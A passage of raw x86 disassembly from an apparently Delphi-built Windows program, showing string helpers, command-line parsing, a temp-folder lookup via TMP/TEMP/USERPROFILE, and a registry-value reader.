  406959:	5b                   	pop    %ebx
  40695a:	c3                   	ret
  40695b:	8b c3                	mov    %ebx,%eax
  40695d:	e8 92 c9 ff ff       	call   0x4032f4
  406962:	8d 14 03             	lea    (%ebx,%eax,1),%edx
  406965:	8b c3                	mov    %ebx,%eax
  406967:	e8 04 00 00 00       	call   0x406970
  40696c:	5b                   	pop    %ebx
  40696d:	c3                   	ret
  40696e:	8b c0                	mov    %eax,%eax
  406970:	52                   	push   %edx
  406971:	50                   	push   %eax
  406972:	e8 ad db ff ff       	call   0x404524
  406977:	c3                   	ret
  406978:	53                   	push   %ebx
  406979:	56                   	push   %esi
  40697a:	57                   	push   %edi
  40697b:	55                   	push   %ebp
  40697c:	8b ea                	mov    %edx,%ebp
  40697e:	8b f0                	mov    %eax,%esi
  406980:	b2 01                	mov    $0x1,%dl
  406982:	8b c6                	mov    %esi,%eax
  406984:	e8 bb fd ff ff       	call   0x406744
  406989:	8b f8                	mov    %eax,%edi
  40698b:	8b c6                	mov    %esi,%eax
  40698d:	e8 62 c9 ff ff       	call   0x4032f4
  406992:	8b d8                	mov    %eax,%ebx
  406994:	eb 01                	jmp    0x406997
  406996:	4b                   	dec    %ebx
  406997:	3b fb                	cmp    %ebx,%edi
  406999:	7d 15                	jge    0x4069b0
  40699b:	8d 14 1e             	lea    (%esi,%ebx,1),%edx
  40699e:	8b c6                	mov    %esi,%eax
  4069a0:	e8 cb ff ff ff       	call   0x406970
  4069a5:	8a 00                	mov    (%eax),%al
  4069a7:	e8 04 fd ff ff       	call   0x4066b0
  4069ac:	84 c0                	test   %al,%al
  4069ae:	75 e6                	jne    0x406996
  4069b0:	8b c6                	mov    %esi,%eax
  4069b2:	e8 3d c9 ff ff       	call   0x4032f4
  4069b7:	3b d8                	cmp    %eax,%ebx
  4069b9:	75 0b                	jne    0x4069c6
  4069bb:	8b c5                	mov    %ebp,%eax
  4069bd:	8b d6                	mov    %esi,%edx
  4069bf:	e8 68 c8 ff ff       	call   0x40322c
  4069c4:	eb 0f                	jmp    0x4069d5
  4069c6:	55                   	push   %ebp
  4069c7:	8b cb                	mov    %ebx,%ecx
  4069c9:	ba 01 00 00 00       	mov    $0x1,%edx
  4069ce:	8b c6                	mov    %esi,%eax
  4069d0:	e8 7f ca ff ff       	call   0x403454
  4069d5:	5d                   	pop    %ebp
  4069d6:	5f                   	pop    %edi
  4069d7:	5e                   	pop    %esi
  4069d8:	5b                   	pop    %ebx
  4069d9:	c3                   	ret
  4069da:	8b c0                	mov    %eax,%eax
  4069dc:	55                   	push   %ebp
  4069dd:	8b ec                	mov    %esp,%ebp
  4069df:	6a 00                	push   $0x0
  4069e1:	53                   	push   %ebx
  4069e2:	56                   	push   %esi
  4069e3:	57                   	push   %edi
  4069e4:	8b d8                	mov    %eax,%ebx
  4069e6:	33 c0                	xor    %eax,%eax
  4069e8:	55                   	push   %ebp
  4069e9:	68 24 6a 40 00       	push   $0x406a24
  4069ee:	64 ff 30             	push   %fs:(%eax)
  4069f1:	64 89 20             	mov    %esp,%fs:(%eax)
  4069f4:	8d 55 fc             	lea    -0x4(%ebp),%edx
  4069f7:	8b c3                	mov    %ebx,%eax
  4069f9:	e8 7a ff ff ff       	call   0x406978
  4069fe:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406a01:	e8 0e ca ff ff       	call   0x403414
  406a06:	50                   	push   %eax
  406a07:	e8 20 da ff ff       	call   0x40442c
  406a0c:	8b d8                	mov    %eax,%ebx
  406a0e:	33 c0                	xor    %eax,%eax
  406a10:	5a                   	pop    %edx
  406a11:	59                   	pop    %ecx
  406a12:	59                   	pop    %ecx
  406a13:	64 89 10             	mov    %edx,%fs:(%eax)
  406a16:	68 2b 6a 40 00       	push   $0x406a2b
  406a1b:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406a1e:	e8 75 c7 ff ff       	call   0x403198
  406a23:	c3                   	ret
  406a24:	e9 d3 c3 ff ff       	jmp    0x402dfc
  406a29:	eb f0                	jmp    0x406a1b
  406a2b:	8b c3                	mov    %ebx,%eax
  406a2d:	5f                   	pop    %edi
  406a2e:	5e                   	pop    %esi
  406a2f:	5b                   	pop    %ebx
  406a30:	59                   	pop    %ecx
  406a31:	5d                   	pop    %ebp
  406a32:	c3                   	ret
  406a33:	90                   	nop
  406a34:	e8 a3 ff ff ff       	call   0x4069dc
  406a39:	83 f8 ff             	cmp    $0xffffffff,%eax
  406a3c:	74 04                	je     0x406a42
  406a3e:	a8 10                	test   $0x10,%al
  406a40:	75 03                	jne    0x406a45
  406a42:	33 c0                	xor    %eax,%eax
  406a44:	c3                   	ret
  406a45:	b0 01                	mov    $0x1,%al
  406a47:	c3                   	ret
  406a48:	53                   	push   %ebx
  406a49:	8b d8                	mov    %eax,%ebx
  406a4b:	8b c3                	mov    %ebx,%eax
  406a4d:	e8 8a ff ff ff       	call   0x4069dc
  406a52:	40                   	inc    %eax
  406a53:	0f 95 c0             	setne  %al
  406a56:	5b                   	pop    %ebx
  406a57:	c3                   	ret
  406a58:	53                   	push   %ebx
  406a59:	56                   	push   %esi
  406a5a:	57                   	push   %edi
  406a5b:	8b da                	mov    %edx,%ebx
  406a5d:	8b f8                	mov    %eax,%edi
  406a5f:	8b c3                	mov    %ebx,%eax
  406a61:	ba ff 00 00 00       	mov    $0xff,%edx
  406a66:	e8 85 ca ff ff       	call   0x4034f0
  406a6b:	8b 03                	mov    (%ebx),%eax
  406a6d:	e8 82 c8 ff ff       	call   0x4032f4
  406a72:	50                   	push   %eax
  406a73:	8b 03                	mov    (%ebx),%eax
  406a75:	e8 9a c9 ff ff       	call   0x403414
  406a7a:	50                   	push   %eax
  406a7b:	8b c7                	mov    %edi,%eax
  406a7d:	e8 92 c9 ff ff       	call   0x403414
  406a82:	50                   	push   %eax
  406a83:	e8 94 d9 ff ff       	call   0x40441c
  406a88:	8b f0                	mov    %eax,%esi
  406a8a:	85 f6                	test   %esi,%esi
  406a8c:	75 09                	jne    0x406a97
  406a8e:	8b c3                	mov    %ebx,%eax
  406a90:	e8 03 c7 ff ff       	call   0x403198
  406a95:	eb 0d                	jmp    0x406aa4
  406a97:	8b c3                	mov    %ebx,%eax
  406a99:	8b d6                	mov    %esi,%edx
  406a9b:	e8 4c 03 00 00       	call   0x406dec
  406aa0:	84 c0                	test   %al,%al
  406aa2:	74 c7                	je     0x406a6b
  406aa4:	5f                   	pop    %edi
  406aa5:	5e                   	pop    %esi
  406aa6:	5b                   	pop    %ebx
  406aa7:	c3                   	ret
  406aa8:	55                   	push   %ebp
  406aa9:	8b ec                	mov    %esp,%ebp
  406aab:	51                   	push   %ecx
  406aac:	53                   	push   %ebx
  406aad:	56                   	push   %esi
  406aae:	57                   	push   %edi
  406aaf:	8b f1                	mov    %ecx,%esi
  406ab1:	89 55 fc             	mov    %edx,-0x4(%ebp)
  406ab4:	33 d2                	xor    %edx,%edx
  406ab6:	89 16                	mov    %edx,(%esi)
  406ab8:	33 c9                	xor    %ecx,%ecx
  406aba:	eb 1c                	jmp    0x406ad8
  406abc:	80 fa 22             	cmp    $0x22,%dl
  406abf:	75 05                	jne    0x406ac6
  406ac1:	80 f1 01             	xor    $0x1,%cl
  406ac4:	eb 11                	jmp    0x406ad7
  406ac6:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  406aca:	74 09                	je     0x406ad5
  406acc:	8b 1e                	mov    (%esi),%ebx
  406ace:	8b 7d fc             	mov    -0x4(%ebp),%edi
  406ad1:	03 fb                	add    %ebx,%edi
  406ad3:	88 17                	mov    %dl,(%edi)
  406ad5:	ff 06                	incl   (%esi)
  406ad7:	40                   	inc    %eax
  406ad8:	8a 10                	mov    (%eax),%dl
  406ada:	84 d2                	test   %dl,%dl
  406adc:	74 0a                	je     0x406ae8
  406ade:	80 fa 20             	cmp    $0x20,%dl
  406ae1:	0f 97 c3             	seta   %bl
  406ae4:	0a d9                	or     %cl,%bl
  406ae6:	75 d4                	jne    0x406abc
  406ae8:	5f                   	pop    %edi
  406ae9:	5e                   	pop    %esi
  406aea:	5b                   	pop    %ebx
  406aeb:	59                   	pop    %ecx
  406aec:	5d                   	pop    %ebp
  406aed:	c3                   	ret
  406aee:	8b c0                	mov    %eax,%eax
  406af0:	55                   	push   %ebp
  406af1:	8b ec                	mov    %esp,%ebp
  406af3:	83 c4 f8             	add    $0xfffffff8,%esp
  406af6:	53                   	push   %ebx
  406af7:	56                   	push   %esi
  406af8:	57                   	push   %edi
  406af9:	33 c9                	xor    %ecx,%ecx
  406afb:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  406afe:	8b f2                	mov    %edx,%esi
  406b00:	8b d8                	mov    %eax,%ebx
  406b02:	33 c0                	xor    %eax,%eax
  406b04:	55                   	push   %ebp
  406b05:	68 6c 6b 40 00       	push   $0x406b6c
  406b0a:	64 ff 30             	push   %fs:(%eax)
  406b0d:	64 89 20             	mov    %esp,%fs:(%eax)
  406b10:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  406b13:	33 d2                	xor    %edx,%edx
  406b15:	8b c3                	mov    %ebx,%eax
  406b17:	e8 8c ff ff ff       	call   0x406aa8
  406b1c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406b1f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406b22:	33 d2                	xor    %edx,%edx
  406b24:	e8 4f c7 ff ff       	call   0x403278
  406b29:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406b2c:	e8 ef c8 ff ff       	call   0x403420
  406b31:	8b d0                	mov    %eax,%edx
  406b33:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  406b36:	8b c3                	mov    %ebx,%eax
  406b38:	e8 6b ff ff ff       	call   0x406aa8
  406b3d:	8b d8                	mov    %eax,%ebx
  406b3f:	8b c6                	mov    %esi,%eax
  406b41:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406b44:	e8 9f c6 ff ff       	call   0x4031e8
  406b49:	eb 01                	jmp    0x406b4c
  406b4b:	43                   	inc    %ebx
  406b4c:	8a 03                	mov    (%ebx),%al
  406b4e:	84 c0                	test   %al,%al
  406b50:	74 04                	je     0x406b56
  406b52:	3c 20                	cmp    $0x20,%al
  406b54:	76 f5                	jbe    0x406b4b
  406b56:	33 c0                	xor    %eax,%eax
  406b58:	5a                   	pop    %edx
  406b59:	59                   	pop    %ecx
  406b5a:	59                   	pop    %ecx
  406b5b:	64 89 10             	mov    %edx,%fs:(%eax)
  406b5e:	68 73 6b 40 00       	push   $0x406b73
  406b63:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406b66:	e8 2d c6 ff ff       	call   0x403198
  406b6b:	c3                   	ret
  406b6c:	e9 8b c2 ff ff       	jmp    0x402dfc
  406b71:	eb f0                	jmp    0x406b63
  406b73:	8b c3                	mov    %ebx,%eax
  406b75:	5f                   	pop    %edi
  406b76:	5e                   	pop    %esi
  406b77:	5b                   	pop    %ebx
  406b78:	59                   	pop    %ecx
  406b79:	59                   	pop    %ecx
  406b7a:	5d                   	pop    %ebp
  406b7b:	c3                   	ret
  406b7c:	55                   	push   %ebp
  406b7d:	8b ec                	mov    %esp,%ebp
  406b7f:	6a 00                	push   $0x0
  406b81:	53                   	push   %ebx
  406b82:	56                   	push   %esi
  406b83:	57                   	push   %edi
  406b84:	8b d8                	mov    %eax,%ebx
  406b86:	33 c0                	xor    %eax,%eax
  406b88:	55                   	push   %ebp
  406b89:	68 c0 6b 40 00       	push   $0x406bc0
  406b8e:	64 ff 30             	push   %fs:(%eax)
  406b91:	64 89 20             	mov    %esp,%fs:(%eax)
  406b94:	e8 73 d8 ff ff       	call   0x40440c
  406b99:	8d 55 fc             	lea    -0x4(%ebp),%edx
  406b9c:	e8 4f ff ff ff       	call   0x406af0
  406ba1:	8b d0                	mov    %eax,%edx
  406ba3:	8b c3                	mov    %ebx,%eax
  406ba5:	e8 1a c7 ff ff       	call   0x4032c4
  406baa:	33 c0                	xor    %eax,%eax
  406bac:	5a                   	pop    %edx
  406bad:	59                   	pop    %ecx
  406bae:	59                   	pop    %ecx
  406baf:	64 89 10             	mov    %edx,%fs:(%eax)
  406bb2:	68 c7 6b 40 00       	push   $0x406bc7
  406bb7:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406bba:	e8 d9 c5 ff ff       	call   0x403198
  406bbf:	c3                   	ret
  406bc0:	e9 37 c2 ff ff       	jmp    0x402dfc
  406bc5:	eb f0                	jmp    0x406bb7
  406bc7:	5f                   	pop    %edi
  406bc8:	5e                   	pop    %esi
  406bc9:	5b                   	pop    %ebx
  406bca:	59                   	pop    %ecx
  406bcb:	5d                   	pop    %ebp
  406bcc:	c3                   	ret
  406bcd:	8d 40 00             	lea    0x0(%eax),%eax
  406bd0:	55                   	push   %ebp
  406bd1:	8b ec                	mov    %esp,%ebp
  406bd3:	6a 00                	push   $0x0
  406bd5:	53                   	push   %ebx
  406bd6:	56                   	push   %esi
  406bd7:	57                   	push   %edi
  406bd8:	33 c0                	xor    %eax,%eax
  406bda:	55                   	push   %ebp
  406bdb:	68 1b 6c 40 00       	push   $0x406c1b
  406be0:	64 ff 30             	push   %fs:(%eax)
  406be3:	64 89 20             	mov    %esp,%fs:(%eax)
  406be6:	e8 21 d8 ff ff       	call   0x40440c
  406beb:	8d 55 fc             	lea    -0x4(%ebp),%edx
  406bee:	e8 fd fe ff ff       	call   0x406af0
  406bf3:	33 db                	xor    %ebx,%ebx
  406bf5:	eb 09                	jmp    0x406c00
  406bf7:	43                   	inc    %ebx
  406bf8:	8d 55 fc             	lea    -0x4(%ebp),%edx
  406bfb:	e8 f0 fe ff ff       	call   0x406af0
  406c00:	80 38 00             	cmpb   $0x0,(%eax)
  406c03:	75 f2                	jne    0x406bf7
  406c05:	33 c0                	xor    %eax,%eax
  406c07:	5a                   	pop    %edx
  406c08:	59                   	pop    %ecx
  406c09:	59                   	pop    %ecx
  406c0a:	64 89 10             	mov    %edx,%fs:(%eax)
  406c0d:	68 22 6c 40 00       	push   $0x406c22
  406c12:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406c15:	e8 7e c5 ff ff       	call   0x403198
  406c1a:	c3                   	ret
  406c1b:	e9 dc c1 ff ff       	jmp    0x402dfc
  406c20:	eb f0                	jmp    0x406c12
  406c22:	8b c3                	mov    %ebx,%eax
  406c24:	5f                   	pop    %edi
  406c25:	5e                   	pop    %esi
  406c26:	5b                   	pop    %ebx
  406c27:	59                   	pop    %ecx
  406c28:	5d                   	pop    %ebp
  406c29:	c3                   	ret
  406c2a:	8b c0                	mov    %eax,%eax
  406c2c:	55                   	push   %ebp
  406c2d:	8b ec                	mov    %esp,%ebp
  406c2f:	81 c4 f8 fe ff ff    	add    $0xfffffef8,%esp
  406c35:	53                   	push   %ebx
  406c36:	56                   	push   %esi
  406c37:	57                   	push   %edi
  406c38:	33 c9                	xor    %ecx,%ecx
  406c3a:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  406c3d:	8b f2                	mov    %edx,%esi
  406c3f:	8b d8                	mov    %eax,%ebx
  406c41:	33 c0                	xor    %eax,%eax
  406c43:	55                   	push   %ebp
  406c44:	68 ba 6c 40 00       	push   $0x406cba
  406c49:	64 ff 30             	push   %fs:(%eax)
  406c4c:	64 89 20             	mov    %esp,%fs:(%eax)
  406c4f:	85 db                	test   %ebx,%ebx
  406c51:	75 24                	jne    0x406c77
  406c53:	68 04 01 00 00       	push   $0x104
  406c58:	8d 85 f8 fe ff ff    	lea    -0x108(%ebp),%eax
  406c5e:	50                   	push   %eax
  406c5f:	6a 00                	push   $0x0
  406c61:	e8 ee d7 ff ff       	call   0x404454
  406c66:	8b c8                	mov    %eax,%ecx
  406c68:	8d 95 f8 fe ff ff    	lea    -0x108(%ebp),%edx
  406c6e:	8b c6                	mov    %esi,%eax
  406c70:	e8 03 c6 ff ff       	call   0x403278
  406c75:	eb 2d                	jmp    0x406ca4
  406c77:	e8 90 d7 ff ff       	call   0x40440c
  406c7c:	80 38 00             	cmpb   $0x0,(%eax)
  406c7f:	75 0a                	jne    0x406c8b
  406c81:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406c84:	e8 0f c5 ff ff       	call   0x403198
  406c89:	eb 0f                	jmp    0x406c9a
  406c8b:	8d 55 fc             	lea    -0x4(%ebp),%edx
  406c8e:	e8 5d fe ff ff       	call   0x406af0
  406c93:	85 db                	test   %ebx,%ebx
  406c95:	74 03                	je     0x406c9a
  406c97:	4b                   	dec    %ebx
  406c98:	eb e2                	jmp    0x406c7c
  406c9a:	8b c6                	mov    %esi,%eax
  406c9c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406c9f:	e8 88 c5 ff ff       	call   0x40322c
  406ca4:	33 c0                	xor    %eax,%eax
  406ca6:	5a                   	pop    %edx
  406ca7:	59                   	pop    %ecx
  406ca8:	59                   	pop    %ecx
  406ca9:	64 89 10             	mov    %edx,%fs:(%eax)
  406cac:	68 c1 6c 40 00       	push   $0x406cc1
  406cb1:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406cb4:	e8 df c4 ff ff       	call   0x403198
  406cb9:	c3                   	ret
  406cba:	e9 3d c1 ff ff       	jmp    0x402dfc
  406cbf:	eb f0                	jmp    0x406cb1
  406cc1:	5f                   	pop    %edi
  406cc2:	5e                   	pop    %esi
  406cc3:	5b                   	pop    %ebx
  406cc4:	8b e5                	mov    %ebp,%esp
  406cc6:	5d                   	pop    %ebp
  406cc7:	c3                   	ret
  406cc8:	53                   	push   %ebx
  406cc9:	81 c4 fc fe ff ff    	add    $0xfffffefc,%esp
  406ccf:	8b d8                	mov    %eax,%ebx
  406cd1:	68 04 01 00 00       	push   $0x104
  406cd6:	8d 44 24 04          	lea    0x4(%esp),%eax
  406cda:	50                   	push   %eax
  406cdb:	e8 ac d7 ff ff       	call   0x40448c
  406ce0:	8b d3                	mov    %ebx,%edx
  406ce2:	8b c4                	mov    %esp,%eax
  406ce4:	e8 e7 e0 ff ff       	call   0x404dd0
  406ce9:	81 c4 04 01 00 00    	add    $0x104,%esp
  406cef:	5b                   	pop    %ebx
  406cf0:	c3                   	ret
  406cf1:	8d 40 00             	lea    0x0(%eax),%eax
  406cf4:	55                   	push   %ebp
  406cf5:	8b ec                	mov    %esp,%ebp
  406cf7:	6a 00                	push   $0x0
  406cf9:	6a 00                	push   $0x0
  406cfb:	53                   	push   %ebx
  406cfc:	56                   	push   %esi
  406cfd:	57                   	push   %edi
  406cfe:	8b d8                	mov    %eax,%ebx
  406d00:	33 c0                	xor    %eax,%eax
  406d02:	55                   	push   %ebp
  406d03:	68 ac 6d 40 00       	push   $0x406dac
  406d08:	64 ff 30             	push   %fs:(%eax)
  406d0b:	64 89 20             	mov    %esp,%fs:(%eax)
  406d0e:	8b d3                	mov    %ebx,%edx
  406d10:	b8 c4 6d 40 00       	mov    $0x406dc4,%eax
  406d15:	e8 3e fd ff ff       	call   0x406a58
  406d1a:	83 3b 00             	cmpl   $0x0,(%ebx)
  406d1d:	74 0b                	je     0x406d2a
  406d1f:	8b 03                	mov    (%ebx),%eax
  406d21:	e8 0e fd ff ff       	call   0x406a34
  406d26:	84 c0                	test   %al,%al
  406d28:	75 48                	jne    0x406d72
  406d2a:	8b d3                	mov    %ebx,%edx
  406d2c:	b8 d0 6d 40 00       	mov    $0x406dd0,%eax
  406d31:	e8 22 fd ff ff       	call   0x406a58
  406d36:	83 3b 00             	cmpl   $0x0,(%ebx)
  406d39:	74 0b                	je     0x406d46
  406d3b:	8b 03                	mov    (%ebx),%eax
  406d3d:	e8 f2 fc ff ff       	call   0x406a34
  406d42:	84 c0                	test   %al,%al
  406d44:	75 2c                	jne    0x406d72
  406d46:	83 3d 7c b0 40 00 02 	cmpl   $0x2,0x40b07c
  406d4d:	75 1c                	jne    0x406d6b
  406d4f:	8b d3                	mov    %ebx,%edx
  406d51:	b8 e0 6d 40 00       	mov    $0x406de0,%eax
  406d56:	e8 fd fc ff ff       	call   0x406a58
  406d5b:	83 3b 00             	cmpl   $0x0,(%ebx)
  406d5e:	74 0b                	je     0x406d6b
  406d60:	8b 03                	mov    (%ebx),%eax
  406d62:	e8 cd fc ff ff       	call   0x406a34
  406d67:	84 c0                	test   %al,%al
  406d69:	75 07                	jne    0x406d72
  406d6b:	8b c3                	mov    %ebx,%eax
  406d6d:	e8 56 ff ff ff       	call   0x406cc8
  406d72:	8d 55 f8             	lea    -0x8(%ebp),%edx
  406d75:	8b 03                	mov    (%ebx),%eax
  406d77:	e8 0c fb ff ff       	call   0x406888
  406d7c:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406d7f:	8d 55 fc             	lea    -0x4(%ebp),%edx
  406d82:	e8 b1 f8 ff ff       	call   0x406638
  406d87:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406d8a:	8b c3                	mov    %ebx,%eax
  406d8c:	e8 9b c4 ff ff       	call   0x40322c
  406d91:	33 c0                	xor    %eax,%eax
  406d93:	5a                   	pop    %edx
  406d94:	59                   	pop    %ecx
  406d95:	59                   	pop    %ecx
  406d96:	64 89 10             	mov    %edx,%fs:(%eax)
  406d99:	68 b3 6d 40 00       	push   $0x406db3
  406d9e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406da1:	ba 02 00 00 00       	mov    $0x2,%edx
  406da6:	e8 0d c4 ff ff       	call   0x4031b8
  406dab:	c3                   	ret
  406dac:	e9 4b c0 ff ff       	jmp    0x402dfc
  406db1:	eb eb                	jmp    0x406d9e
  406db3:	5f                   	pop    %edi
  406db4:	5e                   	pop    %esi
  406db5:	5b                   	pop    %ebx
  406db6:	59                   	pop    %ecx
  406db7:	59                   	pop    %ecx
  406db8:	5d                   	pop    %ebp
  406db9:	c3                   	ret
  406dba:	00 00                	add    %al,(%eax)
  406dbc:	ff                   	(bad)
  406dbd:	ff                   	(bad)
  406dbe:	ff                   	(bad)
  406dbf:	ff 03                	incl   (%ebx)
  406dc1:	00 00                	add    %al,(%eax)
  406dc3:	00 54 4d 50          	add    %dl,0x50(%ebp,%ecx,2)
  406dc7:	00 ff                	add    %bh,%bh
  406dc9:	ff                   	(bad)
  406dca:	ff                   	(bad)
  406dcb:	ff 04 00             	incl   (%eax,%eax,1)
  406dce:	00 00                	add    %al,(%eax)
  406dd0:	54                   	push   %esp
  406dd1:	45                   	inc    %ebp
  406dd2:	4d                   	dec    %ebp
  406dd3:	50                   	push   %eax
  406dd4:	00 00                	add    %al,(%eax)
  406dd6:	00 00                	add    %al,(%eax)
  406dd8:	ff                   	(bad)
  406dd9:	ff                   	(bad)
  406dda:	ff                   	(bad)
  406ddb:	ff 0b                	decl   (%ebx)
  406ddd:	00 00                	add    %al,(%eax)
  406ddf:	00 55 53             	add    %dl,0x53(%ebp)
  406de2:	45                   	inc    %ebp
  406de3:	52                   	push   %edx
  406de4:	50                   	push   %eax
  406de5:	52                   	push   %edx
  406de6:	4f                   	dec    %edi
  406de7:	46                   	inc    %esi
  406de8:	49                   	dec    %ecx
  406de9:	4c                   	dec    %esp
  406dea:	45                   	inc    %ebp
  406deb:	00 53 56             	add    %dl,0x56(%ebx)
  406dee:	57                   	push   %edi
  406def:	8b f2                	mov    %edx,%esi
  406df1:	8b f8                	mov    %eax,%edi
  406df3:	8b 07                	mov    (%edi),%eax
  406df5:	e8 fa c4 ff ff       	call   0x4032f4
  406dfa:	3b c6                	cmp    %esi,%eax
  406dfc:	0f 9f c3             	setg   %bl
  406dff:	8b c7                	mov    %edi,%eax
  406e01:	8b d6                	mov    %esi,%edx
  406e03:	e8 e8 c6 ff ff       	call   0x4034f0
  406e08:	8b c3                	mov    %ebx,%eax
  406e0a:	5f                   	pop    %edi
  406e0b:	5e                   	pop    %esi
  406e0c:	5b                   	pop    %ebx
  406e0d:	c3                   	ret
  406e0e:	8b c0                	mov    %eax,%eax
  406e10:	55                   	push   %ebp
  406e11:	8b ec                	mov    %esp,%ebp
  406e13:	83 c4 ec             	add    $0xffffffec,%esp
  406e16:	53                   	push   %ebx
  406e17:	56                   	push   %esi
  406e18:	57                   	push   %edi
  406e19:	33 db                	xor    %ebx,%ebx
  406e1b:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  406e1e:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  406e21:	89 55 fc             	mov    %edx,-0x4(%ebp)
  406e24:	8b f8                	mov    %eax,%edi
  406e26:	33 c0                	xor    %eax,%eax
  406e28:	55                   	push   %ebp
  406e29:	68 48 6f 40 00       	push   $0x406f48
  406e2e:	64 ff 30             	push   %fs:(%eax)
  406e31:	64 89 20             	mov    %esp,%fs:(%eax)
  406e34:	33 db                	xor    %ebx,%ebx
  406e36:	33 c0                	xor    %eax,%eax
  406e38:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406e3b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406e3e:	50                   	push   %eax
  406e3f:	6a 00                	push   $0x0
  406e41:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406e44:	50                   	push   %eax
  406e45:	6a 00                	push   $0x0
  406e47:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406e4a:	50                   	push   %eax
  406e4b:	57                   	push   %edi
  406e4c:	e8 6b d5 ff ff       	call   0x4043bc
  406e51:	85 c0                	test   %eax,%eax
  406e53:	0f 85 d9 00 00 00    	jne    0x406f32
  406e59:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406e5c:	3b 45 0c             	cmp    0xc(%ebp),%eax
  406e5f:	74 0c                	je     0x406e6d
  406e61:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406e64:	3b 45 08             	cmp    0x8(%ebp),%eax
  406e67:	0f 85 c5 00 00 00    	jne    0x406f32
  406e6d:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  406e71:	75 0f                	jne    0x406e82
  406e73:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406e76:	e8 1d c3 ff ff       	call   0x403198
  406e7b:	b3 01                	mov    $0x1,%bl
  406e7d:	e9 b0 00 00 00       	jmp    0x406f32
  406e82:	81 7d f0 00 00 00 70 	cmpl   $0x70000000,-0x10(%ebp)
  406e89:	72 05                	jb     0x406e90
  406e8b:	e8 e4 e9 ff ff       	call   0x405874
  406e90:	8b 75 f0             	mov    -0x10(%ebp),%esi
  406e93:	85 f6                	test   %esi,%esi
  406e95:	c1 fe 00             	sar    $0x0,%esi
  406e98:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406e9b:	8b ce                	mov    %esi,%ecx
  406e9d:	33 d2                	xor    %edx,%edx
  406e9f:	e8 d4 c3 ff ff       	call   0x403278
  406ea4:	8d 45 f0             	lea    -0x10(%ebp),%eax
  406ea7:	50                   	push   %eax
  406ea8:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406eab:	e8 70 c5 ff ff       	call   0x403420
  406eb0:	50                   	push   %eax
  406eb1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406eb4:	50                   	push   %eax
  406eb5:	6a 00                	push   $0x0
  406eb7:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406eba:	50                   	push   %eax
  406ebb:	57                   	push   %edi
  406ebc:	e8 fb d4 ff ff       	call   0x4043bc
  406ec1:	3d ea 00 00 00       	cmp    $0xea,%eax
  406ec6:	0f 84 6a ff ff ff    	je     0x406e36
  406ecc:	85 c0                	test   %eax,%eax
  406ece:	75 62                	jne    0x406f32
  406ed0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406ed3:	3b 45 0c             	cmp    0xc(%ebp),%eax
  406ed6:	74 08                	je     0x406ee0
  406ed8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406edb:	3b 45 08             	cmp    0x8(%ebp),%eax
  406ede:	75 52                	jne    0x406f32
  406ee0:	8b 75 f0             	mov    -0x10(%ebp),%esi
  406ee3:	85 f6                	test   %esi,%esi
  406ee5:	c1 fe 00             	sar    $0x0,%esi
  406ee8:	eb 01                	jmp    0x406eeb
  406eea:	4e                   	dec    %esi
  406eeb:	85 f6                	test   %esi,%esi
  406eed:	74 0a                	je     0x406ef9
  406eef:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406ef2:	80 7c 30 ff 00       	cmpb   $0x0,-0x1(%eax,%esi,1)
  406ef7:	74 f1                	je     0x406eea
  406ef9:	83 7d f4 07          	cmpl   $0x7,-0xc(%ebp)
  406efd:	75 05                	jne    0x406f04
  406eff:	85 f6                	test   %esi,%esi
  406f01:	74 01                	je     0x406f04
  406f03:	46                   	inc    %esi
  406f04:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406f07:	8b d6                	mov    %esi,%edx
  406f09:	e8 e2 c5 ff ff       	call   0x4034f0
  406f0e:	83 7d f4 07          	cmpl   $0x7,-0xc(%ebp)
  406f12:	75 11                	jne    0x406f25
  406f14:	85 f6                	test   %esi,%esi
  406f16:	74 0d                	je     0x406f25
  406f18:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406f1b:	e8 00 c5 ff ff       	call   0x403420
  406f20:	c6 44 30 ff 00       	movb   $0x0,-0x1(%eax,%esi,1)
  406f25:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406f28:	8b 55 ec             	mov    -0x14(%ebp),%edx
  406f2b:	e8 b8 c2 ff ff       	call   0x4031e8
  406f30:	b3 01                	mov    $0x1,%bl
  406f32:	33 c0                	xor    %eax,%eax
  406f34:	5a                   	pop    %edx
  406f35:	59                   	pop    %ecx
  406f36:	59                   	pop    %ecx
  406f37:	64 89 10             	mov    %edx,%fs:(%eax)
  406f3a:	68 4f 6f 40 00       	push   $0x406f4f
  406f3f:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406f42:	e8 51 c2 ff ff       	call   0x403198
  406f47:	c3                   	ret
  406f48:	e9 af be ff ff       	jmp    0x402dfc
